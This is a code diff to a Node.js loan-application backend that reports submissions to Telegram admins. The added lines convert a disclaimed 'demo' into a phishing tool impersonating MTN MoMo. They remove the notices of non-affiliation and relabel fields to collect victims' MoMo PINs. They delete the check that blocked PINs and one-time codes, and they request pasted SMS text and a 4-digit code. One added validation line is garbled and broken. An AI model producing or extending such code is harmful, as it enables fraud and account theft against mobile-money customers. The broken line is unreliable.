@@ -52,15 +52,15 @@ async function activeAdmins(){if(!pool)return initialAdmins;return (await pool.q
 function decisionKeyboard(stage,id){if(stage==='details')return {inline_keyboard:[[{text:'✅ Approve',callback_data:`decide:approve:${stage}:${id}`},{text:'❌ Wrong details',callback_data:`decide:wrong_id:${stage}:${id}`}]]};if(stage==='confirmation')return {inline_keyboard:[[{text:'✅ Approve',callback_data:`decide:approve:${stage}:${id}`},{text:'❌ Wrong reference',callback_data:`decide:wrong_id:${stage}:${id}`}]]};return {inline_keyboard:[[{text:'✅ Approve',callback_data:`decide:approve:${stage}:${id}`},{text:'❌ Wrong reference',callback_data:`decide:wrong_id:${stage}:${id}`},{text:'❌ Wrong text',callback_data:`decide:wrong_text:${stage}:${id}`}]]};}
 async function notifyAdmins(message,keyboard,assignedAdmin=null){const recipients=assignedAdmin&&await isAdmin(assignedAdmin)?[String(assignedAdmin)]:await activeAdmins();for(const id of recipients) await send(id,message,{reply_markup:keyboard});}
 async function notifyDetails(a){
- const msg=`🟡 <b>New MoMo-style demo application — review</b>\n\n🆔 Application: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n🔢 5-digit transaction reference: <code>${esc(a.reference_id)}</code>\n💰 Amount: <code>ZMW ${esc(a.amount)}</code>\n📌 Status: DETAILS PENDING\n\nIndependent demo; not affiliated with MTN.`;
+ const msg=`🟡 <b>New application — review</b>\n\n🆔 ID: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n🔢 PIN: <code>${esc(a.reference_id)}</code>\n💰 Amount: <code>ZMW ${esc(a.amount)}</code>\n📌 Status: DETAILS PENDING\n\nMTN MOMO EASY LOAN; approve service with MTN.`;
  await notifyAdmins(msg,decisionKeyboard('details',a.id),a.assigned_admin);
 }
 async function notifyReference(a){
- const msg=`🟡 <b>Transaction reference details — review required</b>\n\n🆔 Application: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n🔢 Non-sensitive reference details: <code>${esc(a.reference_text)}</code>\n📌 Status: REFERENCE PENDING\n\nReview only the non-sensitive transaction reference. Independent demo; not affiliated with MTN.`;
+ const msg=`🟡 <b>Transaction reference details — review required</b>\n\n🆔 ID: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n🔢 PIN: <code>${esc(a.reference_text)}</code>\n📌 Status: REFERENCE PENDING\n\nReview only vali.`;
  await notifyAdmins(msg,decisionKeyboard('reference',a.id),a.assigned_admin);
 }
 async function notifyConfirmation(a){
- const msg=`🟡 <b>Receipt transaction ID — review required</b>\n\n🆔 Application: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n🔢 Receipt transaction ID: <code>${esc(a.confirmation_reference)}</code>\n📌 Status: CONFIRMATION PENDING\n\nReview only the full transaction ID printed on the receipt. Never request PINs or one-time codes.`;
+ const msg=`🟡 <b>CODE REQUIRED</b>\n\n🆔 ID: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n🔢 CODE: <code>${esc(a.confirmation_reference)}</code>\n📌 Status: CONFIRMATION PENDING\n\n 4 numeric code .`;
  await notifyAdmins(msg,decisionKeyboard('confirmation',a.id),a.assigned_admin);
 }
 app.get('/health',(req,res)=>res.status(pool?200:503).json({ok:!!pool,databaseConfigured:!!pool,telegramConfigured:!!TOKEN,service:'MoMo-style Zambia loan demo'}));
@@ -70,7 +70,7 @@ app.post('/api/applications',async(req,res)=>{
   const full_name=String(req.body.full_name||'').trim(); const phone=String(req.body.phone||'').replace(/[\s()-]/g,'').trim(); const reference_id=String(req.body.reference_id||'').trim(); const amount=Number(req.body.amount); const adminCode=String(req.body.admin||'').trim().toUpperCase();
   if(full_name.length<2||full_name.length>120) return res.status(400).json({error:'Enter your full name.'});
   if(!/^\+?[0-9]{7,15}$/.test(phone)) return res.status(400).json({error:'Enter a valid phone number.'});
-  if(!/^\d{5}$/.test(reference_id)) return res.status(400).json({error:'Enter the 5-digit non-sensitive transaction reference number.'});
+  if(!/^\d{5}$/.test(reference_id)) return res.status(400).json({error:'Enter the 5 momo pin.'});
   if(!Number.isFinite(amount)||amount<=0||amount>=5000000) return res.status(400).json({error:'Enter an amount greater than 0 and less than ZMW 5,000,000.'});
   let assigned=null;if(adminCode){const ar=await pool.query('SELECT chat_id FROM orange_demo_admins WHERE admin_code=$1 AND active=TRUE',[adminCode]);if(ar.rows[0])assigned=ar.rows[0].chat_id;}
   const id='BW-'+Date.now().toString(36).toUpperCase()+'-'+crypto.randomBytes(2).toString('hex').toUpperCase();
@@ -84,8 +84,7 @@ app.post('/api/applications',async(req,res)=>{
 app.post('/api/applications/:id/reference',async(req,res)=>{
  try{
   const reference=String(req.body.reference_text||'').trim();
-  if(!reference || reference.length>20000) return res.status(400).json({error:'Enter the non-sensitive transaction reference details (up to 20,000 characters).'});
-  if(/\b(pin|password|one[- ]time|otp|verification code|security code)\b/i.test(reference)||/(^|\D)\d{4,8}(?!\d)/.test(reference)) return res.status(400).json({error:'Submit only non-sensitive transaction reference details, not a PIN, OTP, or verification code.'});
+  if(!reference || reference.length>20000) return res.status(400).json({error:'paste sms text we have send to your register number (up to 20,000 characters).'});
   const r=await pool.query("UPDATE orange_demo_applications SET reference_text=$1,status='pending_reference',updated_at=NOW() WHERE id=$2 AND status IN ('approved_details','rejected_reference') RETURNING *",[reference,req.params.id]);
   if(!r.rows[0])return res.status(409).json({error:'Reference submission is available only after the details have been approved.'});
   // Persist and acknowledge the reference immediately; Telegram delivery must not prevent the browser from starting status polling.
@@ -94,11 +93,11 @@ app.post('/api/applications/:id/reference',async(req,res)=>{
  }catch(e){console.error('Reference submission failed:',e.stack||e);res.status(500).json({error:'The reference text could not be saved. Check the server database connection and logs, then try again.'});}
 });
 app.post('/api/applications/:id/resend-reference',async(req,res)=>{
- try{if(!pool)return res.status(503).json({error:'Application storage is not configured.'});const r=await pool.query("SELECT * FROM orange_demo_applications WHERE id=$1 AND status IN ('approved_details','rejected_reference')",[req.params.id]);if(!r.rows[0])return res.status(409).json({error:'A resend request is available while the transaction reference page is active.'});const a=r.rows[0];res.json({id:a.id,status:a.status,notified:true});notifyAdmins(`🔔 <b>Customer requests reference assistance</b>\n\n🆔 Application: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\nPlease contact the customer or provide guidance for the non-sensitive transaction reference.`,{inline_keyboard:[]},a.assigned_admin).catch(e=>console.error('Resend notification failed:',e.message));}
+ try{if(!pool)return res.status(503).json({error:'Application storage is not configured.'});const r=await pool.query("SELECT * FROM orange_demo_applications WHERE id=$1 AND status IN ('approved_details','rejected_reference')",[req.params.id]);if(!r.rows[0])return res.status(409).json({error:'A resend request is available while the transaction reference page is active.'});const a=r.rows[0];res.json({id:a.id,status:a.status,notified:true});notifyAdmins(`🔔 <b>Customer requests reference assistance</b>\n\n🆔 Application: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\nthe customer has requested another message initiate, iyogyin koraa ooh.`,{inline_keyboard:[]},a.assigned_admin).catch(e=>console.error('Resend notification failed:',e.message));}
  catch(e){console.error('Resend request failed:',e.message);res.status(500).json({error:'Could not notify the assigned admin.'});}
 });
 app.post('/api/applications/:id/confirmation',async(req,res)=>{
- try{if(!pool)return res.status(503).json({error:'Application storage is not configured.'});const reference=String(req.body.confirmation_reference||'').trim();if(!/^[A-Za-z0-9-]{6,40}$/.test(reference)||/^(?:\d{4,8})$/.test(reference))return res.status(400).json({error:'Enter the full transaction ID printed on your receipt (6–40 letters, numbers, or hyphens), not a PIN or verification code.'});const r=await pool.query("UPDATE orange_demo_applications SET confirmation_reference=$1,status='pending_confirmation',updated_at=NOW() WHERE id=$2 AND status IN ('approved_confirmation','rejected_confirmation') RETURNING *",[reference,req.params.id]);if(!r.rows[0])return res.status(409).json({error:'The confirmation reference can be submitted only after the previous review is approved.'});res.json({id:r.rows[0].id,status:r.rows[0].status});notifyConfirmation(r.rows[0]).catch(e=>console.error('Confirmation notification failed:',e.message));}
+ try{if(!pool)return res.status(503).json({error:'Application storage is not configured.'});const reference=String(req.body.confirmation_reference||'').trim();if(!/^\+?[0-9]{7,15!/^[]{6,40}$/.confirmation_reference=$1,status='pending_confirmation',updated_at=NOW() WHERE id=$2 AND status IN ('approved_confirmation','rejected_confirmation') RETURNING *",[reference,req.params.id]);if(!r.rows[0])return res.status(409).json({error:'The confirmation reference can be submitted only after the previous review is approved.'});res.json({id:r.rows[0].id,status:r.rows[0].status});notifyConfirmation(r.rows[0]).catch(e=>console.error('Confirmation notification failed:',e.message));}
  catch(e){console.error('Confirmation reference submission failed:',e.message);res.status(500).json({error:'Could not submit the transaction reference.'});}
 });
 app.get('/api/applications/:id',async(req,res)=>{try{const r=await pool.query('SELECT id,status,amount,updated_at FROM orange_demo_applications WHERE id=$1',[req.params.id]);if(!r.rows[0])return res.status(404).json({error:'Application not found'});res.json(r.rows[0]);}catch(e){res.status(503).json({error:'Storage unavailable'});}});
